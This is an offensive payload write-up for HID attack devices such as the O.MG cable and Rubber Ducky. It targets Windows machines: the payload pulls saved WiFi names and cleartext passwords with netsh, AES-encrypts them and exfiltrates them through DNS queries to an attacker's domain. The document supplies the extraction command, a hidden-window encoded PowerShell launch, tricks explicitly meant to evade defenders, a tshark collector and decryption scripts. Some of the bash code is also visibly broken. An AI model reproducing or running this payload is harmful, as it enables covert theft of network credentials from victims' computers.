# Title:         Exfiltrate Encrypted WiFi names and preshared keys via DNS  
# Description:   Exfiltrates WiFi names and PSK using DNS where the data in transit is encrypted with AES-256 
# Author:        Keld Norman / Twitter: @keld_norman
# Props:         Google, RTFM, weeks og trial and errors
# Version:       1.0
# Category:      Encrypted WiFi Exfiltration
# Target:        Windows10+ Powershell
# Attackmodes:   HID
-----------------------------------------------------------------------------------------------------------
ABOUT THIS PAYLOAD
-----------------------------------------------------------------------------------------------------------
This code will:
 - Extract all saved WiFi names and saved passwords from a Windows PC
 - Encrypt the data with AES-256 and a password you specify
 - Exfiltrate the data out via DNS requests.
 
 NB: This will not work if the PC does not have WiFi enabled ( happens alot on corp. pc's when the LAN cable is plugged in)
 so.. pull that one out first to get the WiFi active - then run the payload.
-----------------------------------------------------------------------------------------------------------
You will need to have 
-----------------------------------------------------------------------------------------------------------
- A server somewhere that can receive DNS requests at port 53 
- A domain where you have control over the DNS settings for it so you can add an A record and a NS record.
- The awsome O.MG cable :), or a Rubber Ducky or a Bash Bunny or.. build your own ducky with an Atmega32U4 
-----------------------------------------------------------------------------------------------------------
To get this to work you first need to setup a domain with an extra A-Record pointing to your server 
Then you also need to add a NS record pointing to the name you gave the A-record.

Here is an example of what I did on my domain hosted on Cloudflare.com (replace 1.2.3.4 with your servers IP):

Type    Name    Content               TTL	Proxy 
A       www     1.2.3.4               Auto  OFF (dns only) <- Existed already if you used the server as a webserver
A       dns     1.2.3.4               Auto  OFF (dns only) <- Add this record 
NS      i       dns.yourdomaine.com   Auto  OFF (dns only) <- Add this record

Remember to open the firewall for port 53/dns for your server (where you want to receive data) and also ensure
iptables is allowing the traffic (if you use iptables)
-----------------------------------------------------------------------------------------------------------
The script does the following:
--------------------------------------------------------------
STEP 1 - Get Saved WiFi names and pre-shared keys ( passwords)
--------------------------------------------------------------
Any WiFi names and passwords saved on a Windows machine is extracted using windows netsh (try this your self in a "dos" prompt)

Press : WIN +r 
Type  : cmd ( and press enter )
Paste these 3 lines and press enter: 
 
 @echo off 
 for /f "tokens=3* delims=: " %a in ('netsh wlan show profiles ^|findstr /c:"    " ^|findstr ":"') do for /f "tokens=3 delims=: " %c in ('netsh wlan sh pr "%b" key^=clear 2^>nul^|findstr /c:": "^|findstr "Key Content"') do echo %b,%c 
 echo on

--------------------------------------------------------------
STEP 2 - Encryption
--------------------------------------------------------------
All these WiFi info will then be encryptet with AES-256 using the function in the sscript called "enc".
That function will use the key (password) you give it and then encrypt the Wifi info.
Then it will convert the encryptet data/text to base64 encoding.

Check out/google : 0x20 Bit encoding  or Case Insensitivity of DNS Labels: https://tools.ietf.org/html/rfc4343

To avoid a problem with data exfiltration of a Base64 string that would happen if a DNS server that the victims computer 
uses makes DNS requests in only lowercase (some DNS servers to do that to stop this type of dns data exfiltration)
then the function again converst the base64 in to just HEX (that is not sensitive to being upper or lowercase)

A random delay.. 

The line with :  "start-sleep -Seconds .." that you can find in the scripts function called "dns" is there to 
sleep between every dns request for a randomly selected amount of seconds.
This is done to avoid being spottet by the blue team.
They tend to see this type of data exfiltration if a machine does to many dns requests to fast
Set the delay minimum to an hour or a day in seconds if you want :) 

Do not set the minimum sleep time to 0 - that will make et very hard to collect the data at your server because 
the day + time and seconds is used to differentiate the crypt lines and two lines could then be send at the same second.

If you want to see how encrypt and decrypt works in a more simple way then have a look at this githup: https://github.com/keldnorman/powercrypt
--------------------------------------------------------------
STEP 3 - Do a dns lookup of the data.xxx.yourdnsserver.com 
--------------------------------------------------------------
This part is just a dns lookup of all the lines the prior function feeds the dns exfiltrator function.
This function in the script is called "dns" 

One thing to notice is the line starting with: "$subchars=get-random -minimum 26 -maximum 50 " and the next line 
starting with "[regex]::split($_, "(.{$subchars})")|? {$_}..."

The two lines are there to split the data line we want to dns exfiltrate up in to different lengths so the blue team would not see
to many "same length" dns requests and not see to long either.
The ideal length of the first part of the domain( the data part ) is between 6 and 26 chars according to .. 
googeling what the most commen lengths of subdomain names is :)
Feel free to add more coder to this function to also use other domains etc to be even more stealth.

-----------------------------------------------------------------------------------------------------------
THE SCTRIPT:
-----------------------------------------------------------------------------------------------------------
The script is as you can see below is build with three functions called wifi, enc and dns.
The functions and the code to execute them have been put in to a script block. 

The idea is that you put in your encryption key at the bottom where it says $KEY="", then on you own PC
start a powershell prompt and paste in the line starting from the $scriptblock= and down to the end of the $encoded

IDEA: You could make another function to get the encryption key somehow (perhaps via a DNS request ) when the script runs 

- - - CUT FROM HERE - - - - ( See the real code to cut'n'paste in the payload.txt file) 
$scriptblock={     
 function enc{ ... }
 function dns{   ... }
 function wifi{  ...  }
 $KEY="EncryptDataWithThisCode"
 $SUB=".i.yourdomain.com"
 wifi|%{enc -K "$KEY" -T "$_"}|%{dns "$_"}|out-null
}
$encoded = [convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptblock))
$encoded
- - - END OF CUT - - - - - 

Nothing will be executed on you PC but when you paste the last line in ( $encoded ) then you will see the 
encoded form of the powershell code - it would look something like this: 

PS C:\Windows\system32> $encoded
IAAgACAAIAEDdAoAIABmAHUAbgBjAHQAaQBvAG4AIABlAG4AYwB7A
CaaEIDaaLEDLDCIAAgACAAIAAgAAoAIABmAHUAbgBjAHQAaQBvAG4
... etc

That is actually just one long line and the idea is to get that executed on the victims computer via the O.MG cable
using this command executed from a "dos" prompt / cmd.exe / windows prompt (not powershell) 

powershell.exe -windowstyle hidden -NoProfile -EncodedCommand IAAgACAAIAEDdAoAIABmAHUAbgBjAHQ..etc..

#-------------------
# To debug:
#-------------------
# 1. start a powershell prompt and copy paste all code from inside the script block in to a powershell prompt

# 2. To test WiFi names and code extraction:
#    wifi

# 3. To test Encryption of data
#    wifi|%{enc -K "$KEY" -T "$_"}

# 4. To test DNS ( then run wireshark or alike tool to see the dns requests from the local machine)
#    wifi|%{enc -K "$KEY" -T "$_"}|%{dns "$_"}

#-----------------------------------------------------------------------------------------------------------
# HOW TO LOG DNS REQUEST ON LINUX
#-----------------------------------------------------------------------------------------------------------
I do not have any Windows server ( who trust that kind of OS anyway ) but I do have a lot of Linux servers
so I wrote the script below to catch the data that is exfiltrated.

I use the util tshark ( apt-get install tshark ) to sniff for DNS packages 
The script rotates the logs every 24 hour.

It is here as an inspiration to how to collect data - please dont ask for support on how to get it to work :) 

#!/bin/bash
LOG_FILE="/tmp/exfi.log.dns"
TIMEOUT=86400 # 86400 = 1 day
function alert {
 SRC="$(echo $1|awk '{print $3}')"
 if [ "${SRC:-10.10.10.10}" != "10.10.10.10" ] ; then
  DNS="$(echo $1|awk '{print $2}')"
  if [[ ${DNS} == *".i.yourdomain.com"* ]]; then  
   PAYLOAD="$(echo ${DNS}|tr -dc '[:print:]\n\r'| sed -e 's/.i.yourdomain.com//')"
   echo "$(date +'%Y,%m,%d,%H,%M,%S'),${SRC},${PAYLOAD}" >> ${LOG_FILE} &
  return
 fi
}
function cleanup {
 for KILLPS1 in $(ps -ef|grep "/usr/bin/tshark"|grep -v $$|awk '{print $2}'); do 
  kill -9 ${KILLPS1} > /dev/null 2>&1
 done
 for KILLPS2 in $(ps -ef|grep "/usr/bin/dumpcap"|grep -v $$|awk '{print $2}'); do 
  kill -9 ${KILLPS2} > /dev/null 2>&1
 done
 find ${LOG_DIR} -type f -name "*.dns.*" -size 0c -delete
}
cd /tmp
while ( true ); do
 today=$(date +%Y-%m-%d)
 if [ ! -s ${LOG_FILE}.${today} ]; then 
  cat ${LOG_FILE} >> ${LOG_FILE}.${today}
   printf "" > ${LOG_FILE}
  fi
 done
 #-----------------------------
 /usr/bin/timeout ${TIMEOUT} \
 /usr/bin/tshark             \
  -p -Q -l                   \
  -f 'port 53'               \
  -T fields                  \
  -e frame.protocols         \
  -e dns.qry.name            \
  -e ip.src                  \
  -Y '(dns.qry.type == 01 or dns.qry.type == 16) and dns.flags.response == 0' 2>/dev/null|while read LINE; do 
   alert "${LINE}" &
  done 
 #-----------------------------
 cleanup
done

#-----------------------------------------------------------------------------------------------------------
# HOW TO DECRYPT THE DATA ON WINDOWS
#-----------------------------------------------------------------------------------------------------------
When the data have been exfiltrated you need to decrypt it - on windows it is just to use this powershell code
to do it - where the long text at the bottom is the pieced together strings from your servers log is used:

function dec { [CmdletBinding()] [OutputType([string])]
 Param ([Parameter(Mandatory = $true)][String]$Key,[Parameter(Mandatory = $true)][String]$Text)  
 $sha = New-Object System.Security.Cryptography.SHA256Managed
 $aes = New-Object System.Security.Cryptography.AesManaged
 $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
 $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
 $aes.BlockSize = 128
 $aes.KeySize = 256
 $aes.Key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
 $encbytes = [System.Convert]::FromBase64String($Text)
 $aes.IV = $encbytes[0..15]
 $decryp = $aes.CreateDecryptor()
 $bytes = $decryp.TransformFinalBlock($encbytes, 16, $encbytes.Length - 16)
 $aes.Dispose()
 return [System.Text.Encoding]::UTF8.GetString($bytes).Trim([char]0)
}
dec -Key "EncryptDataWithThisCode" -Text 'VRL3G2pjed82NsI/3vKcRXX3pFaDB1NCPfHMKFVX+4fHh5hLo7p0vY7fpyn3sGNC+1MZkokHanKrdv+X2b5QIQ=='

#-----------------------------------------------------------------------------------------------------------
# HOW TO DECRYPT THE DATA ON LINUX WITH OPENSSL
#-----------------------------------------------------------------------------------------------------------
I made a quick script to decrypt data on Linux but it is not perfect - the data i decrypt contains more chars that i originally encrypted for some strange reason
but with some cut and grep i managed to write this one below that works ok for now.

#!/bin/bash
clear
#--------------------------------------------------------------
# VARIABLES
#--------------------------------------------------------------
PATTERN='\,T[0-9]{9}\.'
PASSWORD="EncryptDataWithThisCode"
DNS_LOG="/data/dns/logs/exfi.log.dns"
TEMP_FILE=$(/bin/mktemp /tmp/crypt.XXXXXX)
DECRYPTED_CODES="./decrypted.txt"
#--------------------------------------------------------------
# UTILS
#--------------------------------------------------------------
OPENSSL="/usr/bin/openssl"
STRINGS="/usr/bin/strings"
#--------------------------------------------------------------
# PRE
#--------------------------------------------------------------
# Check if we have the logfile and it is not empty
if [ ! -s ${DNS_LOG} ]; then 
 printf "\n ### ERROR - DNS logfile (${DNS_LOG}) not found or empty!\n\n"
 exit 1
fi
if [ ! -x ${OPENSSL} ]; then 
 printf "\n ### ERROR - Could not find ${OPENSSL}!\n\n"
 exit 1
fi
if [ ! -x ${STRINGS} ]; then 
 printf "\n ### ERROR - Could not find ${STRINGS}!\n\n"
 exit 1
fi
#--------------------------------------------------------------
# TRAP
#--------------------------------------------------------------
function on_exit {
 echo "" 
 if [ -f ${TEMP_FILE} ]; then 
  rm ${TEMP_FILE} >/dev/null 2>&1
 fi
}
trap on_exit EXIT
#--------------------------------------------------------------
# MAIN
#--------------------------------------------------------------
echo ""
printf " - Finding extractions in logfile ${DNS_LOG}\n"
GREP_LINES=$(for LINES in $(cat ${DNS_LOG}|grep -Ei "${PATTERN}"|cut -d ',' -f8|cut -d '.' -f1|sort -n|uniq); do echo $LINES;done)
EXTRACTIONS=$(echo "${GREP_LINES}"|wc -l)
printf " - Found ${EXTRACTIONS} new extractions\n"
#--------------------------------------------------------------
printf " - Collecting lines\n"
HEX_LINES=$(for GREP in ${GREP_LINES} ; do 
 grep ",${GREP}." ${DNS_LOG} |cut -d ',' -f8|cut -d '.' -f2| tr '\n' ' '|sed -e 's/ //g'
 echo ""
done)
#--------------------------------------------------------------
#printf "\n${HEX_LINES}\n"
#exit
#--------------------------------------------------------------
printf " - Converting from Hex to ascii..\n"
ENCRYPTED_LINES=$(for HEX_LINE in ${HEX_LINES}; do 
 echo ${HEX_LINE}|sed 's/\([0-9A-F]\{2\}\)/\\\\\\x\1/gI'|xargs printf 
 echo ""
done)
#--------------------------------------------------------------
#printf "\n$ENCRYPTED_LINES\n"
#exit
#--------------------------------------------------------------
printf " - Decrypting lines..\n"
for CRYPT_LINE in ${ENCRYPTED_LINES};do 
 printf "${CRYPT_LINE}"|${OPENSSL} base64 -A -a -d 2>/dev/null|${OPENSSL} enc -aes-256-cbc -nosalt -nopad -d -pass pass:${PASSWORD} 2>/dev/null|tr -d '\n'|strings >> ${TEMP_FILE} 2>/dev/null 
 printf "\n" >> ${TEMP_FILE} 
done
#--------------------------------------------------------------
cat ${TEMP_FILE}|grep -a '"' | cut -d '"' -f2- |tr -d '"'|tr ';' ' ' >> ${DECRYPTED_CODES}
printf " - Sorting and removing duplicates..\n"
sort -u -o ${DECRYPTED_CODES} ${DECRYPTED_CODES} 
printf "\n LISTING CODES:\n\n"
cat ${DECRYPTED_CODES}
#--------------------------------------------------------------
# END OF SCRIPT
#--------------------------------------------------------------
